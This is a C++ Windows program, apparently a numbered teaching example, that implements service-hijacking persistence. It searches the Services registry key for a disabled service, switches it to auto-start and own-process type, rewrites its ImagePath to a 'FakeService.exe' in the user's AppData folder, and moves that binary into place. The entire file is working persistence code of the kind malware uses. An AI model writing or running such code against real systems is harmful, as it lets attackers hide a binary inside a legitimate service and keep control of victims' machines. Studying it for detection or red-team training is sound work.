// Example 3 - Services.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include "pch.h"
#include <iostream>
#include <windows.h>
#include <stdlib.h>
#include <tlhelp32.h>
#include <tchar.h>
#include <string>
#include <shlwapi.h>
#include <comdef.h>
#include <sstream>
#include <vector>
#include <Shlobj.h> 

using namespace std;
void error(DWORD retval) {
	//Simple Wrapper for print errors
	_com_error error(retval);
	wcout << error.ErrorMessage() << endl;
}

bool checkError(DWORD retval) {
	//Wrapper for Checking errors and debugging them with debug builds
#ifdef _DEBUG
	error(retval);
#endif
	return retval != 0;
}


int main()
{
	//Grab the SYSTEM\\ControlSet001\\Services Registry key and open it and save to hkey
	HKEY hkey;
	string s = "SYSTEM\\ControlSet001\\Services";
	long retval = RegOpenKeyExA(HKEY_LOCAL_MACHINE, s.c_str(), 0, KEY_ALL_ACCESS, &hkey);
	if (checkError(retval)) {
		return -1;
	}

	DWORD index = 0;
	CHAR buffer[512] = { 0 };
	//Begin walking every registry key in the SYSTEM\\ControlSet001\\Service
	while (TRUE) {
		//Enumerate and save to the buffer
		retval = RegEnumKeyA(hkey, index, buffer, sizeof(buffer));
		if (retval == ERROR_NO_MORE_ITEMS) {
			//Hit the end of list and found nothing, die
			error(retval);
			break;
		}
		index++; 
#ifdef _DEBUG
		cout << buffer << endl;
#endif
		
		string temp(buffer);
		DWORD value;
		DWORD buffersize = sizeof(value);
#ifdef _DEBUG
		cout << temp.c_str() << endl;
#endif 
		//Grab the Start key of the current enumerated item
		retval = RegGetValueA(hkey, temp.c_str(), "Start", RRF_RT_DWORD, NULL, &value, &buffersize);
		if (checkError(retval)) {
			//Doesn't have a Start key, something is wrong, bail
			return -1;
		}

		else {
			//Acquired the Start key
#ifdef _DEBUG
			cout << value << endl;
#endif
			if (value == 4) {
				//Check if the Value is 4, aka service is unused
				cout << "Found: "  << temp << endl;

				//Grab the Users current home directory
				char tempHomePath[MAX_PATH];
				long result = SHGetFolderPathA(NULL, CSIDL_PROFILE, NULL, 0, tempHomePath);
				string user_directory(tempHomePath);

				//Build a location to put the Fake Service into
				string full_path = "";
				full_path.append(user_directory);
				full_path.append("\\AppData\\Local\\FakeService.exe");

#ifdef _DEBUG
				cout << full_path << endl;
#endif
				//Modify the value of the Start key to 2, thus it will start on its own
				value = 2;
				retval = RegSetKeyValueA(hkey, temp.c_str(), "Start", REG_DWORD, &value, sizeof(value));
				if (retval != 0) {
					//Failed, fixing the value back to 4
#ifdef _DEBUG
					error(retval);
#endif
					value = 4;
					retval = RegSetKeyValueA(hkey, temp.c_str(), "Start", REG_DWORD, &value, sizeof(value));
					break;
				}
				//Change the Type to 0x10, aka it runs in its own process
				value = 0x10;
				retval = RegSetKeyValueA(hkey, temp.c_str(), "Type", REG_DWORD, &value, sizeof(value));
				if (retval != 0) {
#ifdef _DEBUG
					error(retval);
#endif 
					break;
				}
				//Modify the image path to our fake service
				retval = RegSetKeyValueA(hkey,temp.c_str(), "ImagePath", REG_SZ, full_path.c_str(), full_path.length());
				if (retval != 0) {
#ifdef _DEBUG
					error(retval);
#endif
					break;
				}
				//Create string with the name of the binary to move
				CHAR cwd[MAX_PATH];
				GetCurrentDirectoryA(MAX_PATH, cwd);
				string cwd_(cwd);
				cwd_.append("\\FakeService.exe");
#ifdef _DEBUG
				cout << cwd_.c_str() << endl;
#endif
				//Move the binary to the Appdata Local location for the service
				retval = MoveFileExA(cwd_.c_str(), full_path.c_str(), MOVEFILE_COPY_ALLOWED);
				if (checkError(retval)) {
					return -1;
				}
				break;
			}
		}
		
		
	}
	return 0;
}
